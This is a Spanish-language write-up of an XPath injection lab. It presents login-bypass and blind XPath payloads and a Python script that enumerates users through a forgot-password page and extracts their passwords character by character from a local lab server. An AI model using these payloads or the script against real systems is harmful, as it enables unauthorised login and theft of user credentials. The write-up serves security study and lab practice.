## 🚨 XPath Injection (XPath-Lab)
- Aplicación vulnerable a inyección XPath, un lenguaje que permite construir expresiones que recorren y procesan un documento XML.
- En este caso, disponemos de un formulario de inicio de sesión que no está correctamente sanitizado, lo que puede llevar a un atacante a extraer información valiosa del servidor.
- Además, la web tiene una opción de recuperar contraseña que es vulnerable a **user enumeration**, por lo que mediante un ataque de fuerza bruta podemos encontrar usuarios válidos.

Gracias a este input malicioso, podemos darnos cuenta de la inyección, ya que conseguimos hacer un bypass del login:

```sh
username=test&password=' or '1'='1
```

Pero si además disponemos de usuarios válidos, podemos deducir la contraseña de estos empleando este input:

```sh
username=test&password=test' or username='{username}' and string-length(password)='{longitud a probar}
```
Por último, una vez que disponemos de la longitud de la contraseña, podemos extraerla caracter a caracter:

```sh
username=test&password=test' or username='{username}' and substring(password,1,1)='{caracter a probar}
```

Ya que hacer esto a mano es muy tedioso, he desarrollado este script que automatiza la inyección y enumera los usuarios existentes así como sus contraseñas:

```python
import requests, signal, sys, string
from termcolor import colored

# CTRL+C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo ....\n",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://192.168.1.60:5010/"
forgot_password_url = "http://192.168.1.60:5010/forgot-password"
chars = string.ascii_letters + string.digits + string.punctuation

def load_user_wordlist():
    user_wordlist = []
    with open('users_dictionary.txt', 'r') as file:
        for user in file:
            user_wordlist.append(user.strip())
    return user_wordlist

def get_users():
    user_wordlist = load_user_wordlist()
    valid_users = []
    for user in user_wordlist:
        post_data = {
            "username": f"{user}"
        }

        r = requests.post(forgot_password_url, data=post_data)

        if not "Usuario no encontrado" in r.text:
            valid_users.append(user)

    return valid_users

def get_password_length(user):
    
    for i in range(1, 30):

        post_data = {
            "username": "test",
            "password": f"test' or username='{user}' and string-length(password)='{i}"
        }

        r = requests.post(login_url, data=post_data)

        if not "Invalid credentials" in r.text:
            return i

def get_password(user, password_lenth):
    password = ""
    for i in range(1, password_length + 1):
        for character in chars:
            post_data = {
                "username": "test",
                "password": f"test' or username='{user}' and substring(password,{i},1)='{character}"
            }

            r = requests.post(login_url, data=post_data)

            if not "Invalid credentials" in r.text:
                password += character
                break
    return password


if __name__ == "__main__":

    valid_users = get_users()
    print(colored("\n[*] Usuarios encontrados: " + ", ".join(valid_users) + "\n",'blue'))

    for user in valid_users:
        password_length = get_password_length(user)
        print(colored("[i] La longitud de la contraseña de {} es: {}\n".format(user, password_length),'yellow'))
        password = get_password(user, password_length)
        print(colored("\t[+] Contraseña de {}: {}\n".format(user, password),'green'))
```

La parte de la enumeración de usuarios existentes ha sido posible ya que existe una funcionalidad en la web que permite recuperar la contraseña. Sin embargo, podemos saber cuando un usuario existe gracias a la respuesta del servidor (se trata de otro fallo de seguridad, esta vez a **user enumeration**). 